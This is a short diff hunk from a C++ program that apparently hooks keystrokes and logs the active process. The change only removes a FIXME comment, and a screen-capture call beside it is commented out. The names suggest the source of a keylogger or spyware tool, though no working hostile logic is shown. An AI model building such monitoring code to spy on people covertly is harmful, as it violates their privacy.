@@ -31,7 +31,7 @@ int main() {
 
   Stream::WriteLog("[*] BOOT [*]",
 				   KeyHook::activeProcess,
-				   false); // FIXME ProcessChanged always true? value not updated?
+				   false);
   /*Screen::CaptureScreen(path,
 						"winpst",
 						true,
